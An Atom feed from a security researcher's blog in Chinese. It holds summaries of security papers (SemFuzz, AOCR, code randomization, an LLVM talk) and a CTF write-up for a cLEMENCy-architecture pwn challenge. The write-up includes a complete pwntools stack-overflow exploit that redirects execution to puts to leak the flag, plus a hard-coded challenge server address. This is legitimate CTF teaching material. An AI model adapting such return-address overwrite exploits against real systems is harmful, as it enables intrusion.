<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星博‘s</title>
  
  <subtitle>PHD的自我修养</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://windcarp.github.io/"/>
  <updated>2018-10-10T09:37:31.326Z</updated>
  <id>https://windcarp.github.io/</id>
  
  <author>
    <name>cxm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>论文阅读分享(2018)</title>
    <link href="https://windcarp.github.io/2018/04/11/Academic_share/"/>
    <id>https://windcarp.github.io/2018/04/11/Academic_share/</id>
    <published>2018-04-10T17:32:26.000Z</published>
    <updated>2018-10-10T09:37:31.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17"><a href="#1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17" class="headerlink" title="1. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits (CCS 17)"></a>1. <strong>SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits (CCS 17)</strong></h2><p>本篇发表在最新的CCS 2017上，其工作主要是，基于linux kernel，采集CVE和git log中隐含的漏洞信息，通过自然语言处理进行分析，并使用Fuzz的手段（粗粒度和细粒度），产生能运行到漏洞函数的POC exploit。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw388tg94mj30w10b0n5o.jpg" alt=""></p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw3895lltxj30eb09caco.jpg" alt=""></p><p>最终的效果是在满足条件的122个CVE里成功产生了18个Poc，并顺便发现了一个0day和一个Undisclosed漏洞。</p><p><strong>Paper:</strong> <a href="https://acmccs.github.io/papers/p2139-youA.pdf" target="_blank" rel="noopener">https://acmccs.github.io/papers/p2139-youA.pdf</a></p><p><strong>Slide:</strong> <a href="http://t.cn/E7yAyog" target="_blank" rel="noopener">http://t.cn/E7yAyog</a></p><hr><h2 id="2-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17"><a href="#2-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17" class="headerlink" title="2. Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity (NDSS17)"></a>2. <strong>Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity (NDSS17)</strong></h2><p>这篇文章来自于MIT的Lincoln实验室，发表在今年的NDSS17上。这篇文章讲述的是针对防御Code Reuse方式的攻击，主要针对Execute Only，提出了一种新的利用方法AOCR(Address Oblivious Code Reuse)，这种方法可以绕过绝大多数的防御。</p><p>AOCR的攻击简单概括分两步：</p><ol><li>找到Indirect code pointer和函数的对应关系</li><li>通过Malicious Loop Redirection将找到的Code pointer进行Chaining并调用，完成操作</li></ol><p>这篇文章最后给出了Nginx和Apache的实际漏洞的利用（未放出代码），并绕过了绝大多数的防御措施。</p><p><strong>Paper:</strong> <a href="https://www.ics.uci.edu/~perl/ndss17_aocr.pdf" target="_blank" rel="noopener">https://www.ics.uci.edu/~perl/ndss17_aocr.pdf</a></p><p><strong>Slide:</strong> <a href="https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing</a></p><hr><h2 id="3-Compiler-assisted-Code-Randomization-Oakland-18"><a href="#3-Compiler-assisted-Code-Randomization-Oakland-18" class="headerlink" title="3. Compiler-assisted Code Randomization (Oakland 18)"></a>3. <strong>Compiler-assisted Code Randomization (Oakland 18)</strong></h2><p>这篇文章是一篇基于编译器，做代码随机化的文章。</p><p>这篇文章的亮点是，和之前的工作相比，实现了Basic Block级的细粒度随机化，可以在Client端以很小的Overhead生成以及运行；而且和现有的软件部署系统相兼容；</p><p>其原理可以概述为，在编译时，收集关于程序的布局、Fixup、BasicBlock等必须的信息，在Client端使用Binary Rewriter根据这些信息，对BasicBlock进行随机排列。</p><p>最后作者基于LLVM和Gold plugin实现了原型系统，并取得了很低的Overhead。作者在会议后将开源原型代码。</p><p><strong>Paper:</strong> <a href="https://cs.brown.edu/~vpk/papers/ccr.sp18.pdf" target="_blank" rel="noopener">https://cs.brown.edu/~vpk/papers/ccr.sp18.pdf</a></p><p><strong>Slide:</strong> <a href="http://t.cn/E7yPCam" target="_blank" rel="noopener">http://t.cn/E7yPCam</a></p><hr><hr><h2 id="4-Getting-Started-at-LLVM-Yet-another-LLVM-Tutorial-实践沙龙分享"><a href="#4-Getting-Started-at-LLVM-Yet-another-LLVM-Tutorial-实践沙龙分享" class="headerlink" title="4. Getting Started at LLVM - Yet another LLVM Tutorial(实践沙龙分享)"></a>4. <strong>Getting Started at LLVM - Yet another LLVM Tutorial(实践沙龙分享)</strong></h2><p>周四晚在实验室简单分享了LLVM相关的入门知识。Slide里介绍了以下内容：</p><ul><li>编译器的一些背景知识</li><li>LLVM的设计</li><li>一些LLVM中重要的概念与IR语言</li><li>LLVM编译中的实现细节<ul><li>Pass与优化</li><li>Code Generator与SelectionDAG</li></ul></li><li>LLVM的引用</li></ul><p><strong>Slide:</strong> <a href="https://docs.google.com/presentation/d/18MS6hXvyGXJcjR5rpFFnUCNb8MYdoamrplIySchFPKM/edit?usp=sharing" target="_blank" rel="noopener">https://docs.google.com/presentation/d/18MS6hXvyGXJcjR5rpFFnUCNb8MYdoamrplIySchFPKM/edit?usp=sharing</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17&quot;&gt;&lt;a href=&quot;#1-SemFuzz-Semantics-based-Automatic-Ge
      
    
    </summary>
    
      <category term="Academic" scheme="https://windcarp.github.io/categories/Academic/"/>
    
    
      <category term="Paper" scheme="https://windcarp.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub 线下沙龙CTF之cLEMENCy题解</title>
    <link href="https://windcarp.github.io/2017/08/14/Writeup/"/>
    <id>https://windcarp.github.io/2017/08/14/Writeup/</id>
    <published>2017-08-14T07:27:12.000Z</published>
    <updated>2018-10-10T09:01:07.729Z</updated>
    
    <content type="html"><![CDATA[<p>8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅~</p><p>上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的<strong>烧烤 + 德州扑克</strong>之后便是Pwnhub的经典项目CTF，其中Explorer大佬出了一道<code>cLEMENCy</code>架构的题目。</p><p>提到<code>cLEMENCy</code>就不得不提到刚过去的<code>Defcon 25 Final</code>。与去年的CGC不同，<code>Defcon Final</code>今年的规则是，主办方与比赛前一天24小时放出自定义架构，以及相应的<code>emulator</code>，留给参赛者24小时的准备时间。这样一来，所有的参赛队都站在了同一起跑线上，需要从0准备所有的工具。</p><h2 id="0x01-简介：9bit的奇怪架构"><a href="#0x01-简介：9bit的奇怪架构" class="headerlink" title="0x01 简介：9bit的奇怪架构"></a>0x01 简介：9bit的奇怪架构</h2><p><code>cLEMENCy（the LEgitbs Middle ENdian Computer architecture）</code>由LBS的lighting等大佬们设计。<code>cLEMENCy</code>的指令手册中给出了架构的所有细节。简单的总结如下：</p><ol><li><p>每字节由9bit组成；使用混合序存储，Register XXYYZZ → Memory YYXXZZ，Register XXYY → Memory YYXX</p><blockquote><p>“Each byte is 9 bits of data, bit 0 is the left most significant bit. Middle-Endian data stores bits 9 to 17, followed by bits 0 to 8, then bits 18 to 27 in memory when handling three bytes. Two bytes of data will have bits 9-17 then bits 0 to 8 written to memory.”</p></blockquote></li><li><p>内存布局：如下图所示。漏洞利用的目标即把Flag页面开始的一段内存，即flag打印出来。所以说只需要任意地址读就可以了。</p><p> <img src="https://ws3.sinaimg.cn/large/006tNc79gy1fija68reuoj310y0hkn1b.jpg" alt=""></p></li><li><p>指令集：cLEMENCy是RISC，不过最长54bit，指令集和arm有点类似；</p></li><li><p>寄存器：共31个寄存器，<code>R0</code>一般用于<code>param 1</code>和<code>ret value</code>，<code>ST</code>表示栈，<code>RA</code>表示返回地址。</p></li><li><p>栈调用：栈有两个增长方向；对栈的操作往往通过<code>STT(Store Tri)</code>指令实现。<code>STTm</code>指令有三种，其中0，1，2分别表示内容存入memory之后<code>rB</code>操作数是增加还是减少，从而表示栈的增长方向。</p></li></ol><p>除此之外，比赛中使用的bianry使用了<code>neatlibc</code>，但为了方便模拟器对io和内存管理进行了一些修改。</p><h2 id="0x02-漏洞利用：Ret2Put"><a href="#0x02-漏洞利用：Ret2Put" class="headerlink" title="0x02 漏洞利用：Ret2Put"></a>0x02 漏洞利用：Ret2Put</h2><p>既然是2个小时的CTF，大佬们出题肯定是放足了水233。用IDA大概分析一下，可以发现这是一个简单的伪<code>&quot;Base64&quot;</code>。</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijbgetydzj312w0ocdoa.jpg" alt=""></p><blockquote><p>这里用的是<code>Tea Deliverers</code>在比赛时使用的<code>IDA Processor</code>（膜LYM和Explorer和GYC等大佬）。PPP在赛后也放出了他们比赛时使用的<a href="https://github.com/pwning/defcon25-public" target="_blank" rel="noopener">Utils</a>。</p></blockquote><p>其中主要的函数<code>read_string</code>:输入一个9bit表示的字符串（交互也全部都是基于9bit），之后会以三字节为单位，转成以三字节为单位的值。如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;AAA\n&apos; -&gt; 0010101</span><br></pre></td></tr></table></figure></p><p>在调用这个函数时，传入的len过长，于是可以溢出上一个函数的返回地址，因此我们可以直接<code>Ret2put</code>，即修改返回地址和参数为<code>Put</code>函数和<code>flag page</code>的地址，即可打印出flag。</p><p>观察main_func返回处，<code>LDT R28-RA, [R28 + 0]</code>将R28, ST, RA三个寄存器赋值，是可控的，而puts的参数R0也通过<code>ad. R0, R28, R27</code>控制。</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fijbr5ncb1j30kx0euq7p.jpg" alt=""><br>A</p><p>于是构造对应值即可。</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijc2pzv9uj30iq068gnz.jpg" alt=""></p><p>还有一点是，ST要填上一个合法值，否则<code>puts</code>时会<code>crash</code>。但是程序是没有随机化的，所以每次运行都一样。这也导致了比赛时”抄作业(直接重放)”异常方便。</p><p>最终代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p27</span><span class="params">(bit24)</span>:</span></span><br><span class="line">    r = bin(bit24)[<span class="number">2</span>:].rjust(<span class="number">27</span>, <span class="string">'0'</span>)</span><br><span class="line">    r = r[<span class="number">9</span>:<span class="number">18</span>] + r[<span class="number">0</span>:<span class="number">9</span>] + r[<span class="number">18</span>:<span class="number">27</span>]</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sb8tosb9</span><span class="params">(payload)</span>:</span></span><br><span class="line">    stream = <span class="string">''</span>.join(bin(ord(x))[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> payload)</span><br><span class="line">    pad = len(stream) % <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> pad != <span class="number">0</span>:</span><br><span class="line">        length = len(stream) + (<span class="number">8</span> - pad)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = len(stream)</span><br><span class="line">    stream = stream.ljust(length, <span class="string">'0'</span>)</span><br><span class="line">    payload9 = <span class="string">''</span>.join(</span><br><span class="line">        chr(int(stream[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(stream), <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> payload9</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sb9tosb8</span><span class="params">(payload)</span>:</span></span><br><span class="line">    stream = <span class="string">''</span>.join(bin(ord(x))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> payload)</span><br><span class="line">    length = (len(stream) / <span class="number">9</span>) * <span class="number">9</span></span><br><span class="line">    stream = stream[:length]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(</span><br><span class="line">        chr(int(stream[i:i + <span class="number">9</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(stream), <span class="number">9</span>))</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    alphabet += (chr(i + ord(<span class="string">'A'</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    alphabet += (chr(i + ord(<span class="string">'a'</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    alphabet += (chr(i + ord(<span class="string">'0'</span>)))</span><br><span class="line">alphabet += <span class="string">'+/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conventer</span><span class="params">(bit18)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[:<span class="number">6</span>],<span class="number">2</span>)]</span><br><span class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[<span class="number">6</span>:<span class="number">12</span>],<span class="number">2</span>)]</span><br><span class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[<span class="number">-6</span>:],<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"54.223.103.62"</span>,<span class="number">10000</span>)</span><br><span class="line">flag_addr = <span class="number">0x4010000</span> + <span class="number">0x21</span></span><br><span class="line">pc_addr = <span class="number">0x645F</span></span><br><span class="line">newpld = <span class="number">11</span> * p27(<span class="number">0x414141</span>) + p27(flag_addr) + p27(<span class="number">0x3fffbc7</span>) + p27(pc_addr)</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(newpld) / <span class="number">18</span>):</span><br><span class="line">    payload += conventer(newpld[i*<span class="number">18</span>:(i+<span class="number">1</span>)*<span class="number">18</span>])</span><br><span class="line">p.send(sb8tosb9(payload + <span class="string">'\n'</span>))</span><br><span class="line">p.recvn(<span class="number">0x2d</span>)</span><br><span class="line">data = sb9tosb8(p.recvall(timeout = <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure><p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fijbzy7fl3j30c7014t91.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅~&lt;/p&gt;
&lt;p&gt;上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的&lt;strong&gt;烧烤 + 德州扑克&lt;/s
      
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
